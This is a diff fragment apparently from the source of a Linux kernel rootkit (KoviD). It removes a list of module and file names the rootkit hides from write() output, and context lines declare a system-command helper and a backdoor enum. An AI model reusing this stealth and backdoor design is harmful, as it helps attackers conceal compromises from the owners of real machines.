@@ -146,14 +146,6 @@ int kv_run_system_command(char **);
 /** VM operations */
 unsigned long kv_get_elf_vm_start(pid_t);
 
-/*
- * Hide these names from write() fs output
- */
-static const char *kv_hide_str_on_load[] = {
-    ".kovid", "kovid", "kovid.ko", UUIDGEN ".ko",
-    UUIDGEN ".sh", ".sshd_orig", NULL
-};
-
 enum {
     KV_TASK,
     /* The following indicates a backdoor
